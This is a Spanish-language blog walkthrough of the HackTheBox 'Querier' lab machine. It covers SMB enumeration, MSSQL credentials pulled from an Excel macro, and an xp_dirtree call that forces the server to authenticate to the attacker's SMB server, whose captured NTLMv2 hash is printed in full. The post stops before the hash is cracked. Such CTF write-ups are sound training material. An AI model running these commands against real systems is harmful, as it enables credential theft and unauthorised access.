<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Querier (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Querier (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-09T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Querier (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-09T00:00:00-06:00","datePublished":"2024-04-09T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Querier (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/09/querier.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Querier (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-09T00:00:00-06:00" itemprop="datePublished">
        Apr 9, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/9fe0cda48876d1e8772de183c9546f78.png" />
</p>

<p>En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Excel en la cual mediante marcos encontraremos una función que contiene credenciales para conectarnos al servicio MSSQL que esta corriendo en la maquina ya dentro abusaremos del xp_dirtree para hacer una petición a nuestro recurso compartido y capturar el has ntlmv2 de un usuario que vamos a crackear para conectarnos de nuevo al servicio MSSQL y abusar del xp_cmdshell y obtener una reverse shell para la escalada de privilegios vamos a usar el gpp-decrypt para obtener la contraseña en texto plano que es del administrador y como extra explotaremos el SeImpersonatePrivilege.</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de los puertos abiertos por el protocolo <strong>TCP</strong> y también escaneamos sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.67.247 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-05 12:44 CST
Nmap scan report <span class="k">for </span>10.129.67.247
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info:
|   10.129.67.247:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.67.247:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-05T18:40:54
|_Not valid after:  2054-04-05T18:40:54
|_ssl-date: 2024-04-05T18:45:35+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-05T18:45:27
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vemos propiedades de la maquina y el dominio al cual pertenece que es <code class="language-plaintext highlighter-rouge">HTB.LOCAL</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si listamos recursos compartidos por <strong>SMB</strong> vemos que no obtenemos nada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">--shares</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
</code></pre></div></div>

<ul>
  <li>Sin embargo si lo hacemos con la herramienta <code class="language-plaintext highlighter-rouge">smbclient</code> vemos que si nos muestra los típicos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> 10.129.67.247 <span class="nt">-N</span>

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	Reports         Disk
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.129.67.247 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Vamos a cuales si tenemos capacidad de lectura o escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
 <span class="nt">-----------------------------------------------------------------------------</span>
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de lectura al recurso <code class="language-plaintext highlighter-rouge">Reports</code> vamos a enumerar lo que esta adentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-r</span> Reports

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
 <span class="nt">-----------------------------------------------------------------------------</span>
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
	./Reports
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	<span class="nb">.</span>
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 17:26:31 2019	Currency Volume Report.xlsm
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.xlsm</code>.</li>
</ul>

<blockquote>
  <p>El formato de archivo XLSM es parte de la aplicación de hoja de cálculo de Microsoft Excel. Es un formato de archivo de libro de trabajo habilitado para macros que permite a los usuarios almacenar y compartir macros y datos de hojas de cálculo.</p>
</blockquote>

<ul>
  <li>Vamos a emplear <code class="language-plaintext highlighter-rouge">smbclient</code> para conectarnos y descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient //10.129.67.247/Reports <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Jan 28 17:23:48 2019
  ..                                  D        0  Mon Jan 28 17:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019

		5158399 blocks of size 4096. 850432 blocks available
smb: <span class="se">\&gt;</span> get <span class="s2">"Currency Volume Report.xlsm"</span>
getting file <span class="se">\C</span>urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm <span class="o">(</span>33.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 33.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</p>
  </li>
  <li>
    <p>De primeras no vemos nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/querier/1.png" />
</p>

<ul>
  <li>
    <p>Pero podemos ver las macros <a href="https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos">https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos</a> yéndonos al apartado <code class="language-plaintext highlighter-rouge">Tools</code> y Macros.</p>
  </li>
  <li>
    <p>Podemos ver básicamente una función que se llama <code class="language-plaintext highlighter-rouge">Connect().</code></p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/querier/2.png" />
</p>

<ul>
  <li>Se conecta a una base de datos <code class="language-plaintext highlighter-rouge">SQL Server</code> y nos comparten credenciales además de leer el contenido de la tabla <code class="language-plaintext highlighter-rouge">volume</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Usuario</th>
      <th>Contraseña</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>reporting</td>
      <td>PcwTWTHRwryjc$c6</td>
    </tr>
  </tbody>
</table>

<h2 id="shell-as-mssql-svc">Shell as mssql-svc</h2>

<ul>
  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS
</code></pre></div></div>

<ul>
  <li>Bueno si probamos haciéndolo a nivel de <code class="language-plaintext highlighter-rouge">WORKGROUP</code> o autenticación local si nos funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">-d</span> WORKGROUP
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
</code></pre></div></div>

<ul>
  <li>Bueno lo que vamos hacer es que como tenemos el puerto <code class="language-plaintext highlighter-rouge">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM</code> abierto nos vamos a conectar al servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/reporting@10.129.67.247 <span class="nt">-windows-auth</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>No podemos usar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y tampoco podemos activarlo por que no tenemos permisos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: The EXECUTE permission was denied on the object <span class="s1">'xp_cmdshell'</span>, database <span class="s1">'mssqlsystemresource'</span>, schema <span class="s1">'sys'</span><span class="nb">.</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> <span class="nb">enable </span>xp_cmdshell
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Incorrect syntax near <span class="s1">'xp_cmdshell'</span><span class="nb">.</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es roba el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> en el proceso de la autenticación abusando del <code class="language-plaintext highlighter-rouge">xp_dirtree</code> ya que nos permite listar recursos compartidos a nivel de red de algún servidor y nosotros desde nuestra maquina de atacante con <code class="language-plaintext highlighter-rouge">smbserver</code> vamos a crear un recurso a nivel de red para que se autentique y capturar el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora si usamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> para listar los recursos compartidos por detrás viaja la autenticación y capturaremos el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_dirtree <span class="se">\\</span>10.10.15.11<span class="se">\s</span>mbserver
subdirectory   depth   file
<span class="nt">------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Capturamos el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:254a4df4a95e2690a16c8afd14b68f0a:01010000000000008088a8e09187da0102326448f746e93a00000000010010004d007500590056006700510047004600030010004d00750059005600670051004700460002001000530075006f0053006b006d007900540004001000530075006f0053006b006d0079005400070008008088a8e09187da0106000400020000000800300030000000000000000000000000300000b8458b27b9ac92b92824508e47e300b1dd167c58ec5b12b4846757d2eb899f100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003100000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a crackear el hash para ver la contraseña en texto plano.</li>
</ul>

